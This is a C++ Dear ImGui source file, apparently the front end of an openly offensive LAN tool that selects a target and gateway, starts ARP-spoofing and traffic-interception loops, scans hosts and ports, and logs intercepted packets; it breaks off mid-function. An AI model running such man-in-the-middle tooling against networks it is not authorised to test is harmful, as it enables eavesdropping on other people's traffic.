#include "Client.h"
#include "imgui/imgui.h"
#include <WS2spi.h>
#include <thread>
#include <mutex>

// Must be included last
#include "FileDialog.h"

#define CHECK_TO_BLINK_ELEMENT (fmodf((float)ImGui::GetTime(), 0.80f) < 0.34f)
#define INTERCEPTED_PACKET_BUFFER_SIZE 2000

static std::vector<PacketNode> s_intercepted_packets;
static std::mutex s_packet_interception_mutex;
static std::mutex s_filter_options_mutex;

void ClientApplication::init()
{
	// Load user settings
	m_config.read_config();

	// Setting the theme
	bool dark_theme = m_config.get_bool_value(CONFIG_KEY_DARK_THEME);
	
	if (dark_theme)
		set_dark_theme_colors();
	else
		set_light_theme_colors();

	// Default packet setup
	m_selected_packet = std::make_shared<GenericPacket>();
	s_intercepted_packets.clear();

	// Setting the dump file path
	if (m_config.get_bool_value(CONFIG_KEY_LOG_PACKETS))
	{
		auto filepath = m_config.get_string_value(CONFIG_KEY_PACKET_LOG_PATH);
		net_utils::set_packet_dump_path(filepath);
	}

	// Load network adapters
	m_adapter_list.find_adapters();

	// Load the MAC vendor database
	m_vendor_decoder.load_vendor_list();

	// Apply initial user settings
	apply_user_settings();

	// Load UI textures
	load_textures();
}

void ClientApplication::apply_user_settings()
{
	// Put any default loading code here...
}

void ClientApplication::render()
{
	// Create dockspace
	ImGui::DockSpaceOverViewport(ImGui::GetMainViewport());

	// Render the menu bar
	render_menu_bar();

	// If the user wants to open settings,
	// display the settings popup window.
	if (m_display_settings_window)
	{
		ImGui::OpenPopup(m_settings_window_id);
		m_display_settings_window = false;
	}
	render_settings_window();

	// If there is no selected adapter, render
	// the adapter list so the user can select
	// their desired adapter.
	if (!m_selected_adapter.is_online)
	{
		render_adapters_list();
		return;
	}

	// At this point, a specific adapter has been selected.
	// First, render the local network info and attack data.
	render_attack_window();

	// If the user needs to select the target,
	// display the target selection window.
	if (m_display_select_mitm_target_window)
	{
		ImGui::OpenPopup(m_select_mitm_target_window_id);
		m_display_select_mitm_target_window = false;
	}
	render_mitm_target_selection_window();

	// If the user needs to select the gateway,
	// display the target selection window.
	if (m_display_select_mitm_gateway_window)
	{
		ImGui::OpenPopup(m_select_mitm_gateway_window_id);
		m_display_select_mitm_gateway_window = false;
	}
	render_mitm_gateway_selection_window();

	// If the user needs to select the target for port scanning,
	// display the target selection window.
	if (m_display_select_portscan_target_window)
	{
		ImGui::OpenPopup(m_select_portscan_target_window_id);
		m_display_select_portscan_target_window = false;
	}
	render_portscan_target_selection_window();

	// Render the appropriate attack window
	switch (m_attack_type)
	{
	case AttackType_::ArpPoisoning: { render_intercepted_traffic_window(); break; }
	case AttackType_::PortScanning: { render_portscan_results_window(); break; }
	default: break;
	}

	// Render packet inspection window
	render_packet_inspection_window();

	// Render any double clicked
	// packet inspection windows.
	render_independent_inspection_windows();
}

void ClientApplication::shutdown()
{
	m_mitm_data.attack_in_progress = false;
	m_portscan_data.attack_in_progress = false;
}

void ClientApplication::set_dark_theme_colors()
{
	auto& colors = ImGui::GetStyle().Colors;
	colors[ImGuiCol_WindowBg] = ImVec4{ 0.1f, 0.105f, 0.11f, 1.0f };
	colors[ImGuiCol_ChildBg] = ImVec4{ 0.1f, 0.105f, 0.11f, 1.0f };
	colors[ImGuiCol_PopupBg] = ImVec4{ 0.1f, 0.105f, 0.11f, 1.0f };
	colors[ImGuiCol_ModalWindowDimBg] = ImVec4{ 0.5f, 0.505f, 0.51f, 0.5f };
	colors[ImGuiCol_Text] = ImVec4{ 1.0f, 1.0f, 1.0f, 1.0f };
	colors[ImGuiCol_MenuBarBg] = ImVec4{ 0.1f, 0.105f, 0.11f, 1.0f };
	colors[ImGuiCol_CheckMark] = ImVec4{ 1.0f, 1.0f, 1.0f, 1.0f };

	// Headers
	colors[ImGuiCol_Header] = ImVec4{ 0.2f, 0.205f, 0.21f, 1.0f };
	colors[ImGuiCol_HeaderHovered] = ImVec4{ 0.3f, 0.305f, 0.31f, 1.0f };
	colors[ImGuiCol_HeaderActive] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };

	// Buttons
	colors[ImGuiCol_Button] = ImVec4{ 0.2f, 0.205f, 0.21f, 1.0f };
	colors[ImGuiCol_ButtonHovered] = ImVec4{ 0.3f, 0.305f, 0.31f, 1.0f };
	colors[ImGuiCol_ButtonActive] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };

	// Frame BG
	colors[ImGuiCol_FrameBg] = ImVec4{ 0.2f, 0.205f, 0.21f, 1.0f };
	colors[ImGuiCol_FrameBgHovered] = ImVec4{ 0.3f, 0.305f, 0.31f, 1.0f };
	colors[ImGuiCol_FrameBgActive] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };

	// Tabs
	colors[ImGuiCol_Tab] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };
	colors[ImGuiCol_TabHovered] = ImVec4{ 0.38f, 0.3805f, 0.381f, 1.0f };
	colors[ImGuiCol_TabActive] = ImVec4{ 0.28f, 0.2805f, 0.281f, 1.0f };
	colors[ImGuiCol_TabUnfocused] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };
	colors[ImGuiCol_TabUnfocusedActive] = ImVec4{ 0.2f, 0.205f, 0.21f, 1.0f };

	// Title
	colors[ImGuiCol_TitleBg] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };
	colors[ImGuiCol_TitleBgActive] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };
	colors[ImGuiCol_TitleBgCollapsed] = ImVec4{ 0.15f, 0.1505f, 0.151f, 1.0f };

	
}

void ClientApplication::set_light_theme_colors()
{
	auto& colors = ImGui::GetStyle().Colors;
	colors[ImGuiCol_WindowBg] = ImVec4{ 0.9f, 0.905f, 0.91f, 1.0f };
	colors[ImGuiCol_ChildBg] = ImVec4{ 0.9f, 0.905f, 0.91f, 1.0f };
	colors[ImGuiCol_PopupBg] = ImVec4{ 0.85f, 0.86f, 0.868f, 1.0f };
	colors[ImGuiCol_ModalWindowDimBg] = ImVec4{ 0.5f, 0.505f, 0.51f, 0.5f };
	colors[ImGuiCol_Text] = ImVec4{ 0.0f, 0.0f, 0.0f, 1.0f };
	colors[ImGuiCol_MenuBarBg] = ImVec4{ 0.8f, 0.805f, 0.81f, 1.0f };
	colors[ImGuiCol_CheckMark] = ImVec4{ 0, 0, 0, 1.0f };

	// Headers
	colors[ImGuiCol_Header] = ImVec4{ 0.8f, 0.805f, 0.81f, 1.0f };
	colors[ImGuiCol_HeaderHovered] = ImVec4{ 0.7f, 0.705f, 0.71f, 1.0f };
	colors[ImGuiCol_HeaderActive] = ImVec4{ 0.85f, 0.8505f, 0.851f, 1.0f };

	// Buttons
	colors[ImGuiCol_Button] = ImVec4{ 0.8f, 0.805f, 0.81f, 1.0f };
	colors[ImGuiCol_ButtonHovered] = ImVec4{ 0.7f, 0.705f, 0.71f, 1.0f };
	colors[ImGuiCol_ButtonActive] = ImVec4{ 0.85f, 0.8505f, 0.851f, 1.0f };

	// Frame BG
	colors[ImGuiCol_FrameBg] = ImVec4{ 0.8f, 0.805f, 0.81f, 1.0f };
	colors[ImGuiCol_FrameBgHovered] = ImVec4{ 0.7f, 0.705f, 0.71f, 1.0f };
	colors[ImGuiCol_FrameBgActive] = ImVec4{ 0.85f, 0.8505f, 0.851f, 1.0f };

	// Tabs
	colors[ImGuiCol_Tab] = ImVec4{ 0.85f, 0.8505f, 0.851f, 1.0f };
	colors[ImGuiCol_TabHovered] = ImVec4{ 0.62f, 0.6205f, 0.621f, 1.0f };
	colors[ImGuiCol_TabActive] = ImVec4{ 0.72f, 0.7205f, 0.721f, 1.0f };
	colors[ImGuiCol_TabUnfocused] = ImVec4{ 0.85f, 0.8505f, 0.851f, 1.0f };
	colors[ImGuiCol_TabUnfocusedActive] = ImVec4{ 0.8f, 0.805f, 0.81f, 1.0f };

	// Title
	colors[ImGuiCol_TitleBg] = ImVec4{ 0.85f, 0.8505f, 0.851f, 1.0f };
	colors[ImGuiCol_TitleBgActive] = ImVec4{ 0.85f, 0.8505f, 0.851f, 1.0f };
	colors[ImGuiCol_TitleBgCollapsed] = ImVec4{ 0.85f, 0.8505f, 0.851f, 1.0f };
}

void ClientApplication::load_textures()
{
	m_hacker_texture.load_from_file("config/icons/hacker.png");
	m_healthy_computer_texture.load_from_file("config/icons/healthy_computer.png");
	m_poisoned_computer_texture.load_from_file("config/icons/poisoned_computer.png");

	m_pause_capture_texture.load_from_file("config/icons/pause.png");
	m_resume_capture_texture.load_from_file("config/icons/play.png");
}

void ClientApplication::render_menu_bar()
{
	if (ImGui::BeginMainMenuBar())
	{
		if (ImGui::BeginMenu("Settings"))
		{
			m_is_settings_window_opened = true;
			m_display_settings_window = true;
			ImGui::EndMenu();
		}

		ImGui::EndMainMenuBar();
	}

}

void ClientApplication::render_settings_window()
{
	ImGui::SetNextWindowSizeConstraints(ImVec2(500, 500), ImVec2(700, 600));
	if (ImGui::BeginPopupModal(m_settings_window_id, &m_is_settings_window_opened, ImGuiWindowFlags_AlwaysAutoResize))
	{
		const float UI_SETTINGS_HEADER_OFFSET = 40.0f;
		const float NETWORK_SETTINGS_HEADER_OFFSET = 280.0f;

		ImGui::SetCursorPosX(UI_SETTINGS_HEADER_OFFSET);
		ImGui::Text("%s", "UI"); ImGui::SameLine();

		ImGui::SetCursorPosX(NETWORK_SETTINGS_HEADER_OFFSET);
		ImGui::Text("%s", "Network");

		ImGui::Separator();
		ImGui::Spacing();

		ImGui::SetCursorPos(ImVec2(UI_SETTINGS_HEADER_OFFSET - 2.0f, 60.0f));
		bool autosave_layout_val = m_config.get_bool_value(CONFIG_KEY_CUSTOM_USER_LAYOUT);
		if (ImGui::BeartoothCustomCheckbox("Custom User Layout", &autosave_layout_val))
		{
			if (autosave_layout_val)
			{
				ImGui::LoadIniSettingsFromDisk(USER_CUSTOM_UI_LAYOUT_INI_PATH);
				ImGui::GetIO().IniFilename = USER_CUSTOM_UI_LAYOUT_INI_PATH;
			}
			else
			{
				ImGui::GetIO().IniFilename = NULL; // Disable automatic loading/saving .ini file
				ImGui::LoadIniSettingsFromDisk(MAIN_LAYOUT_INI_PATH);
			}

			m_config.write_value(CONFIG_KEY_CUSTOM_USER_LAYOUT, autosave_layout_val);
		}

		ImGui::SetCursorPos(ImVec2(NETWORK_SETTINGS_HEADER_OFFSET - 2.0f, 60.0f));
		bool ip_forwarding_val = m_config.get_bool_value(CONFIG_KEY_IP_FORWARDING);
		if (ImGui::BeartoothCustomCheckbox("IP Forwarding", &ip_forwarding_val))
		{
			bool value_changed = net_utils::set_system_ip_forwarding(ip_forwarding_val);
			
			if (value_changed)
				m_config.write_value(CONFIG_KEY_IP_FORWARDING, ip_forwarding_val);
		}

		ImGui::Spacing();
		ImGui::Spacing();

		ImGui::SetCursorPos(ImVec2(UI_SETTINGS_HEADER_OFFSET - 2.0f, 100.0f));
		bool dark_theme_val = m_config.get_bool_value(CONFIG_KEY_DARK_THEME);
		if (ImGui::BeartoothCustomCheckbox("Dark Theme", &dark_theme_val))
		{
			if (dark_theme_val)
				set_dark_theme_colors();
			else
				set_light_theme_colors();

			m_config.write_value(CONFIG_KEY_DARK_THEME, dark_theme_val);
		}

		ImGui::SetCursorPos(ImVec2(NETWORK_SETTINGS_HEADER_OFFSET - 2.0f, 100.0f));
		bool should_log_packets = m_config.get_bool_value(CONFIG_KEY_LOG_PACKETS);
		if (ImGui::BeartoothCustomCheckbox("Log Intercepted Traffic", &should_log_packets))
		{
			m_config.write_value(CONFIG_KEY_LOG_PACKETS, should_log_packets);
		}
		ImGui::Spacing();

		if (!should_log_packets)
			ImGui::BeginDisabled();

		auto packet_log_filepath = m_config.get_string_value(CONFIG_KEY_PACKET_LOG_PATH);

		ImGui::SetCursorPos(ImVec2(NETWORK_SETTINGS_HEADER_OFFSET - 2.0f, 130.0f));
		ImGui::InputText("Log Filepath", &packet_log_filepath[0], packet_log_filepath.size(), ImGuiInputTextFlags_ReadOnly);

		ImGui::SetCursorPos(ImVec2(NETWORK_SETTINGS_HEADER_OFFSET - 2.0f, 160.0f));
		if (ImGui::Button("Select##PcapLogFile"))
		{
			FileDialogFilter filter;
			filter.AddFilter(L"Pcap File", L".pcap");

			FileDialog create_file_dialog;
			create_file_dialog.SetFilter(filter);

			auto new_path = create_file_dialog.CreateFileDialog();
			
			if (!new_path.empty())
			{
				net_utils::set_packet_dump_path(new_path);
				net_utils::reopen_dump_file();
				m_config.write_value(CONFIG_KEY_PACKET_LOG_PATH, new_path);
			}
		}

		if (!should_log_packets)
			ImGui::EndDisabled();

		ImGui::EndPopup();
	}
}

void ClientApplication::render_adapters_list()
{
	auto window_height = 100 + m_adapter_list.adapters.size() * 60;
	ImGui::SetNextWindowSize(ImVec2(500, (float)window_height));
	ImGui::Begin("Select Adapter", nullptr, ImGuiWindowFlags_AlwaysAutoResize | ImGuiWindowFlags_NoCollapse);

    auto& io = ImGui::GetIO();

    ImGui::Text("Found Adapters: %zi", m_adapter_list.adapters.size());
    ImGui::Separator();

	for (auto& adapter : m_adapter_list.adapters)
	{
		if (ImGui::TreeNode(adapter.description.c_str()))
		{
			constexpr float indent_w = 16.0f;

			ImGui::Spacing();
			ImGui::Indent(indent_w);

			ImGui::Text("ID: %s", adapter.name.c_str());
			ImGui::Text("Address: %s", adapter.address.to_string().c_str());
			ImGui::Text("Netmask: %s", adapter.netmask.to_string().c_str());
			ImGui::Text("Broadcast: %s", adapter.broadcast.to_string().c_str());

			bool b_selected = ImGui::Button("Select##Adapter");
			if (b_selected)
			{
				// Set the selected adapter
				m_selected_adapter = adapter;
				net_utils::set_adapter(m_selected_adapter);

				// Retrieve the local MAC address
				net_utils::retrieve_local_mac_address(m_mitm_data.local_mac_address);
				net_utils::retrieve_local_mac_address(m_portscan_data.local_mac_address);

				// Set the IPv4 field in MITM data structure
				m_mitm_data.local_ip = adapter.address.to_string();
				m_portscan_data.local_ip = adapter.address.to_string();
			}

			ImGui::TreePop();
			ImGui::Spacing();
			ImGui::Separator();
			ImGui::Unindent(indent_w);
		}
		ImGui::Spacing();
	}

	ImGui::End();
}

void ClientApplication::render_attack_window()
{
	ImGui::SetNextWindowSizeConstraints(ImVec2(300, 300), ImVec2(600, 3600));
	ImGui::Begin("Attack Types");

	if (ImGui::BeginTabBar("AttackTypes"))
	{
		if (ImGui::BeginTabItem("ARP Poisoning"))
		{
			ImGui::Spacing();

			m_attack_type = AttackType_::ArpPoisoning;
			render_arp_poisoning_attack_data();
			
			ImGui::EndTabItem();
		}

		if (ImGui::BeginTabItem("Port Scanning"))
		{
			ImGui::Spacing();

			m_attack_type = AttackType_::PortScanning;
			render_port_scanning_attack_data();

			ImGui::EndTabItem();
		}

		ImGui::EndTabBar();
	}

	ImGui::End();
}

void ClientApplication::render_arp_poisoning_attack_data()
{
	const float icon_size = 20.0f;

	// Display Local Data
	ImGui::SetNextItemOpen(m_mitm_local_data_opened_flag);
	m_mitm_local_data_opened_flag = ImGui::TreeNodeEx("Local Info", ImGuiTreeNodeFlags_SpanAvailWidth);
	if (m_mitm_local_data_opened_flag)
	{
		constexpr float indent_w = 16.0f;

		ImGui::Spacing();
		ImGui::Indent(indent_w);

		ImGui::Text("MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X",
			m_mitm_data.local_mac_address[0],
			m_mitm_data.local_mac_address[1],
			m_mitm_data.local_mac_address[2],
			m_mitm_data.local_mac_address[3],
			m_mitm_data.local_mac_address[4],
			m_mitm_data.local_mac_address[5]
		);

		ImGui::SameLine();
		ImGui::Image((void*)m_hacker_texture.get_resource_handle(), ImVec2(icon_size, icon_size));

		ImGui::Text("IPv4: %s", m_mitm_data.local_ip.c_str());

		ImGui::TreePop();
		ImGui::Spacing();
		ImGui::Unindent(indent_w);
	}
	ImGui::Spacing();
	ImGui::Separator();

	// Display Target Data
	ImGui::SetNextItemOpen(m_mitm_target_data_opened_flag);
	m_mitm_target_data_opened_flag = ImGui::TreeNodeEx("Target", ImGuiTreeNodeFlags_SpanAvailWidth);
	if (m_mitm_target_data_opened_flag)
	{
		constexpr float indent_w = 16.0f;

		ImGui::Spacing();
		ImGui::Indent(indent_w);

		if (!m_mitm_data.target_ip.empty())
		{
			ImGui::Text("MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X",
				m_mitm_data.target_mac_address[0],
				m_mitm_data.target_mac_address[1],
				m_mitm_data.target_mac_address[2],
				m_mitm_data.target_mac_address[3],
				m_mitm_data.target_mac_address[4],
				m_mitm_data.target_mac_address[5]
			);
			ImGui::SameLine();

			if (m_mitm_data.attack_in_progress)
				ImGui::Image((void*)m_poisoned_computer_texture.get_resource_handle(), ImVec2(icon_size, icon_size));
			else
				ImGui::Image((void*)m_healthy_computer_texture.get_resource_handle(), ImVec2(icon_size, icon_size));

			ImGui::Text("IPv4: %s", m_mitm_data.target_ip.c_str());
			ImGui::Text((!m_mitm_data.attack_in_progress) ? "ARP Table: Real" : "ARP Table: Spoofed");
			ImGui::Spacing();
		}
		else
		{
			ImGui::Text("Target not selected");
			ImGui::SameLine();
		}

		if (!m_mitm_data.attack_in_progress)
		{
			bool select_clicked = ImGui::Button("Select##ArpPoisonTarget", ImVec2(110, 24));
			if (select_clicked)
			{
				m_display_select_mitm_target_window = true;
				m_is_host_selection_window_opened = true;
			}
		}

		ImGui::TreePop();
		ImGui::Spacing();
		ImGui::Unindent(indent_w);
	}
	ImGui::Spacing();
	ImGui::Separator();

	// Display Gateway Data
	ImGui::SetNextItemOpen(m_mitm_gateway_data_opened_flag);
	m_mitm_gateway_data_opened_flag = ImGui::TreeNodeEx("Gateway", ImGuiTreeNodeFlags_SpanAvailWidth);
	if (m_mitm_gateway_data_opened_flag)
	{
		constexpr float indent_w = 16.0f;

		ImGui::Spacing();
		ImGui::Indent(indent_w);

		if (!m_mitm_data.gateway_ip.empty())
		{
			ImGui::Text("MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X",
				m_mitm_data.gateway_mac_address[0],
				m_mitm_data.gateway_mac_address[1],
				m_mitm_data.gateway_mac_address[2],
				m_mitm_data.gateway_mac_address[3],
				m_mitm_data.gateway_mac_address[4],
				m_mitm_data.gateway_mac_address[5]
			);
			ImGui::SameLine();

			if (m_mitm_data.attack_in_progress)
				ImGui::Image((void*)m_poisoned_computer_texture.get_resource_handle(), ImVec2(icon_size, icon_size));
			else
				ImGui::Image((void*)m_healthy_computer_texture.get_resource_handle(), ImVec2(icon_size, icon_size));

			ImGui::Text("IPv4: %s", m_mitm_data.gateway_ip.c_str());
			ImGui::Text((!m_mitm_data.attack_in_progress) ? "ARP Table: Real" : "ARP Table: Spoofed");
			ImGui::Spacing();
		}
		else
		{
			ImGui::Text("Gateway not selected");
			ImGui::SameLine();
		}

		if (!m_mitm_data.attack_in_progress)
		{
			bool select_clicked = ImGui::Button("Select##ArpPoisonGateway", ImVec2(110, 24));
			if (select_clicked)
			{
				m_display_select_mitm_gateway_window = true;
				m_is_host_selection_window_opened = true;
			}
		}

		ImGui::TreePop();
		ImGui::Spacing();
		ImGui::Unindent(indent_w);
	}
	ImGui::Spacing();

	if (!m_mitm_data.target_ip.empty() &&
		!m_mitm_data.gateway_ip.empty())
	{
		ImGui::Separator();
		for (size_t i = 0; i < 5; ++i) { ImGui::Spacing(); }

		ImGui::SetCursorPosX(ImGui::GetWindowSize().x / 2.0f - 55.0f);

		if (!m_mitm_data.attack_in_progress)
		{
			if (ImGui::Button("Initiate Attack", ImVec2(110, 25)))
			{
				m_mitm_data.attack_in_progress = true;
				start_arp_spoofing_loop();
				start_traffic_interception_loop();
			}
		}
		else
		{

			if (!m_mitm_data.rearping_in_progress)
			{
				if (ImGui::Button("Stop Attack", ImVec2(110, 25)))
				{
					s_intercepted_packets.clear();
					stop_attack_and_restore_arp_tables();
				}
			}
			else if (CHECK_TO_BLINK_ELEMENT)
			{
				ImGui::Text("Re-Arping Targets...");
			}
		}
	}
}

void ClientApplication::render_port_scanning_attack_data()
{
	// Display Target Data
	ImGui::SetNextItemOpen(m_portscan_target_data_opened_flag);
	m_portscan_target_data_opened_flag = ImGui::TreeNodeEx("Target", ImGuiTreeNodeFlags_SpanAvailWidth);
	if (m_portscan_target_data_opened_flag)
	{
		constexpr float indent_w = 16.0f;

		ImGui::Spacing();
		ImGui::Indent(indent_w);

		if (!m_portscan_data.target_ip.empty())
		{
			ImGui::Text("MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X",
				m_portscan_data.target_mac_address[0],
				m_portscan_data.target_mac_address[1],
				m_portscan_data.target_mac_address[2],
				m_portscan_data.target_mac_address[3],
				m_portscan_data.target_mac_address[4],
				m_portscan_data.target_mac_address[5]
			);

			ImGui::Text("IPv4: %s", m_portscan_data.target_ip.c_str());
			ImGui::Spacing();
		}
		else
		{
			ImGui::Text("Target not selected");
			ImGui::SameLine();
		}

		if (!m_portscan_data.attack_in_progress)
		{
			bool select_clicked = ImGui::Button("Select##PortScanTarget", ImVec2(110, 24));
			if (select_clicked)
			{
				m_display_select_portscan_target_window = true;
				m_is_host_selection_window_opened = true;
			}
		}

		ImGui::TreePop();
		ImGui::Spacing();
		ImGui::Unindent(indent_w);
	}

	if (!m_portscan_data.target_ip.empty())
	{
		ImGui::Separator();
		for (size_t i = 0; i < 5; ++i) { ImGui::Spacing(); }

		ImGui::SetCursorPosX(ImGui::GetWindowSize().x / 2.0f - 55.0f);

		if (!m_portscan_data.attack_in_progress)
		{
			if (ImGui::Button("Start Scanning", ImVec2(110, 25)))
			{
				m_portscan_data.scanned_nodes.clear();

				port_scanner::scan_target(
					m_portscan_data.attack_in_progress,
					m_portscan_data.local_mac_address,
					m_portscan_data.local_ip,
					m_portscan_data.target_mac_address,
					m_portscan_data.target_ip,
					m_portscan_data.scanned_nodes,
					8079,
					8081
				);
			}
		}
		else
		{
			if (ImGui::Button("Stop Scan", ImVec2(110, 25)))
			{
				m_portscan_data.attack_in_progress = false;
			}
		}
	}

	ImGui::Spacing();
	ImGui::Separator();
}

void ClientApplication::render_mitm_target_selection_window()
{
	render_generic_host_selection_window(m_select_mitm_target_window_id, m_mitm_data.target_ip, m_mitm_data.target_mac_address);
}

void ClientApplication::render_portscan_target_selection_window()
{
	render_generic_host_selection_window(m_select_portscan_target_window_id, m_portscan_data.target_ip, m_portscan_data.target_mac_address);
}

void ClientApplication::render_mitm_gateway_selection_window()
{
	render_generic_host_selection_window(m_select_mitm_gateway_window_id, m_mitm_data.gateway_ip, m_mitm_data.gateway_mac_address);
}

void ClientApplication::render_generic_host_selection_window(const char* popup_target_id, std::string& ip_buffer, macaddr mac_buffer)
{
	const float IPV4_CURSOR_POS_X		= 8.0f;
	const float MAC_CURSOR_POS_X		= 190.0f;
	const float VENDOR_CURSOR_POS_X		= 400.0f;

	ImGui::SetNextWindowSizeConstraints(ImVec2(500, 500), ImVec2(700, 500));
	if (ImGui::BeginPopupModal(popup_target_id, &m_is_host_selection_window_opened, ImGuiWindowFlags_AlwaysAutoResize))
	{
		ImGui::Text("Hosts Found: %zi", network_scanner::s_network_scan_map.size());
		ImGui::SameLine();
		ImGui::SetCursorPosX(ImGui::GetWindowWidth() - 120);

		if (!m_scanning_network)
		{
			if (ImGui::Button("Scan network"))
			{
				m_scanning_network = true;

				std::thread scanning_thread([this]() {
					auto local_ip = m_mitm_data.local_ip;
					auto ip_prefix = local_ip.substr(0, local_ip.rfind(".") + 1);
					network_scanner::scan_network(m_mitm_data.local_mac_address, local_ip, ip_prefix, &m_vendor_decoder);

					m_scanning_network = false;
				});
				scanning_thread.detach();
			}
		}
		else
		{
			ImGui::Text("Scanning...");
		}

		ImGui::Spacing();
		ImGui::Separator();
		ImGui::Spacing();

		ImGui::SetCursorPosX(IPV4_CURSOR_POS_X);
		ImGui::Text("IPv4");
		ImGui::SameLine();
		ImGui::SetCursorPosX(MAC_CURSOR_POS_X);
		ImGui::Text("MAC");
		ImGui::SameLine();
		ImGui::SetCursorPosX(VENDOR_CURSOR_POS_X);
		ImGui::Text("Vendor");

		ImGui::Spacing();
		ImGui::Separator();
		ImGui::Spacing();

		// Create a copy of the scan map to avoid
		// iteration issues during multithreaded scanning.
		std::map<std::string, network_scanner::netscan_node> scan_map_copy = network_scanner::s_network_scan_map;

		for (auto& [ip, node] : scan_map_copy)
		{
			if (ImGui::Selectable(("##host" + ip).c_str()))
			{
				ip_buffer = ip;
				memcpy(mac_buffer, node.physical_address, sizeof(macaddr));
			}

			ImGui::SameLine();
			ImGui::SetCursorPosX(IPV4_CURSOR_POS_X);
			ImGui::Text("%s", ip.c_str());

			ImGui::SameLine();
			ImGui::SetCursorPosX(MAC_CURSOR_POS_X);
			ImGui::Text("%.2X:%.2X:%.2X:%.2X:%.2X:%.2X",
				node.physical_address[0],
				node.physical_address[1],
				node.physical_address[2],
				node.physical_address[3],
				node.physical_address[4],
				node.physical_address[5]
			);

			ImGui::SameLine();
			ImGui::SetCursorPosX(VENDOR_CURSOR_POS_X);
			ImGui::Text("%s", node.vendor.c_str());

			ImGui::Spacing();
		}

		ImGui::EndPopup();
	}
}

void ClientApplication::render_intercepted_traffic_window()
{
	ImGui::SetNextWindowSizeConstraints(ImVec2(1000, 400), ImVec2(10000, 10000));
	ImGui::Begin("Intercepted Traffic");

	// Packet filters
	ImGui::Text("Packet Filters");

	ImGui::SetCursorPosX(40.0f);
	ImGui::BeartoothCustomCheckbox("DNS", &m_filter_options.dns_filter);

	ImGui::SameLine(); ImGui::SetCursorPosX(120.0f);
	ImGui::BeartoothCustomCheckbox("TLS", &m_filter_options.tls_filter);

	ImGui::SameLine(); ImGui::SetCursorPosX(200.0f);
	ImGui::BeartoothCustomCheckbox("TCP", &m_filter_options.tcp_filter);

	ImGui::SameLine(); ImGui::SetCursorPosX(280.0f);
	ImGui::BeartoothCustomCheckbox("UDP", &m_filter_options.udp_filter);

	ImGui::SameLine(); ImGui::SetCursorPosX(360.0f);
	ImGui::BeartoothCustomCheckbox("ARP", &m_filter_options.arp_filter);

	ImGui::Spacing();
	ImGui::Spacing();

	// Render packet information categories
	ImGui::Spacing();

	ImGui::SetCursorPosX(PACKET_ID_COLUMN_OFFSET);
	ImGui::Text("%s", "ID"); ImGui::SameLine();

	ImGui::SetCursorPosX(PACKET_TIME_COLUMN_OFFSET);
	ImGui::Text("%s", "Time"); ImGui::SameLine();

	ImGui::SetCursorPosX(PACKET_PROTOCOL_COLUMN_OFFSET);
	ImGui::Text("%s", "Protocol"); ImGui::SameLine();

	ImGui::SetCursorPosX(PACKET_SOURCE_COLUMN_OFFSET);
	ImGui::Text("%s", "Source"); ImGui::SameLine();

	ImGui::SetCursorPosX(PACKET_DESTINATION_COLUMN_OFFSET);
	ImGui::Text("%s", "Destination"); ImGui::SameLine();

	ImGui::SetCursorPosX(PACKET_INFO_COLUMN_OFFSET);
	ImGui::Text("%s", "Info"); ImGui::SameLine();

	// Render the pause/resume button
	ImGui::SetCursorPosX(ImGui::GetWindowWidth() - 160);
	const float image_size = 15.0f;
	auto pause_resume_selectable_size = ImVec2(154, 18);

	if (!m_mitm_data.attack_in_progress || m_mitm_data.rearping_in_progress)
		ImGui::BeginDisabled();

	if (!m_mitm_data.packet_capture_paused)
	{
		ImGui::SetCursorPosY(ImGui::GetCursorPosY() - 2);

		if (ImGui::Selectable("##pause_capture", false, 0, pause_resume_selectable_size))
			m_mitm_data.packet_capture_paused = true;

		ImGui::SameLine();
		ImGui::SetCursorPosY(ImGui::GetCursorPosY() + 2);

		ImGui::SetCursorPosX(ImGui::GetWindowWidth() - 144);
		ImGui::Image((void*)m_pause_capture_texture.get_resource_handle(), ImVec2(image_size, image_size));
		ImGui::SameLine();

		ImGui::SetCursorPosY(ImGui::GetCursorPosY() - 2);
		ImGui::Text("%s", "pause capture");
	}
	else
	{
		ImGui::SetCursorPosY(ImGui::GetCursorPosY() - 2);

		if (ImGui::Selectable("##resume_capture", false, 0, pause_resume_selectable_size))
			m_mitm_data.packet_capture_paused = false;

		ImGui::SameLine();
		ImGui::SetCursorPosY(ImGui::GetCursorPosY() + 2);

		ImGui::SetCursorPosX(ImGui::GetWindowWidth() - 144);
		ImGui::Image((void*)m_resume_capture_texture.get_resource_handle(), ImVec2(image_size, image_size));
		ImGui::SameLine();

		ImGui::SetCursorPosY(ImGui::GetCursorPosY() - 2);
		ImGui::Text("%s", "resume capture");
	}

	if (!m_mitm_data.attack_in_progress || m_mitm_data.rearping_in_progress)
		ImGui::EndDisabled();

	// Render the actual intercepted traffic (list of packets)
	ImGui::Separator();
	ImGui::Spacing();
	ImGui::BeginChild("PacketRegion");

	if (!m_mitm_data.attack_in_progress || m_mitm_data.rearping_in_progress)
	{
		auto middle_x = ImGui::GetWindowSize().x / 2.0f - 60.0f;
		auto middle_y = ImGui::GetWindowSize().y / 2.0f - 8.0f;
		ImGui::SetCursorPos(ImVec2(middle_x, middle_y));
		ImGui::Text("No Attack Detected");
	}
	else
	{
		for (size_t i = 0; i < s_intercepted_packets.size(); ++i)
		{
			// Copying the node by value seems to the "thousand packet crash"
			// when there is a flood of packets and when node is taken by reference,
			// the buffer is not read correctly and causes access violation exception.
			auto  node = s_intercepted_packets.at(i);
			auto& header = node.header;
			auto& packet_ref = node.packet_ref;

			// Skip over faulty packets
			if (!packet_ref)
				continue;

			EthHeader* eth_header = get_eth_header(packet_ref->buffer);

			// Check if the packet was originated from the target host
			bool target_is_sender = memcmp(eth_header->src, m_mitm_data.target_mac_address, sizeof(macaddr)) == 0;

			if (!target_is_sender)
				continue;

			if (PacketFilterManager::filter_packet(packet_ref->buffer, &m_filter_options))
			{
				std::string selectable_id = "##selectable_packet" + std::to_string(i);
				ImGui::Selectable(selectable_id.c_str(), node.packet_id == m_selected_packet_id);
